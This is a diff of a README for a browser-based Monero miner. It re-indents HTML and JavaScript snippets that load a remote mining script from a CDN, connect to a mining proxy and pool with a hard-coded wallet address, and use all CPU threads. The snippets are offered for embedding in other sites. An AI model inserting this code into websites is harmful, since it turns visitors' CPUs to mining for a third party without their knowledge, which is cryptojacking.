@@ -30,36 +30,36 @@ Go to https://moneroocean.stream . This is the pool you are connected to, it wil
 
 # Use In Other Projects 
 
-  HTML
+HTML
   
-      <!-- Start Of Mining Code (HTML) -->
-      <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
-      <script>
-          server = "wss://f.xmrminingproxy.com:8181";
-          var pool = "moneroocean.stream";
-          var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
-          var workerId = "nahh"
-          var threads = -1;
-          var password = "";
-          startMining(pool, walletAddress, workerId, threads, password);
-          throttleMiner = 20;
-      </script>
-      <!-- End Of Mining Code (HTML) -->
+    <!-- Start Of Mining Code (HTML) -->
+    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+    <script>
+        server = "wss://f.xmrminingproxy.com:8181";
+        var pool = "moneroocean.stream";
+        var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
+        var workerId = "nahh"
+        var threads = -1;
+        var password = "";
+        startMining(pool, walletAddress, workerId, threads, password);
+        throttleMiner = 20;
+    </script>
+    <!-- End Of Mining Code (HTML) -->
       
-  Javascript
+Javascript
      
-      // Start Of Mining Code (Javascript)
-      var script = document.createElement("script");
-      script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
-      document.head.appendChild(script);
+    // Start Of Mining Code (Javascript)
+    var script = document.createElement("script");
+    script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
+    document.head.appendChild(script);
 
-      server = "wss://f.xmrminingproxy.com:8181";
-      var pool = "moneroocean.stream";
-      var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
-      var workerId = "nahh"
-      var threads = -1;
-      var password = "";
-      startMining(pool, walletAddress, workerId, threads, password);
-      throttleMiner = 20;
-      // End Of Mining Code
+    server = "wss://f.xmrminingproxy.com:8181";
+    var pool = "moneroocean.stream";
+    var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
+    var workerId = "nahh"
+    var threads = -1;
+    var password = "";
+    startMining(pool, walletAddress, workerId, threads, password);
+    throttleMiner = 20;
+    // End Of Mining Code
 
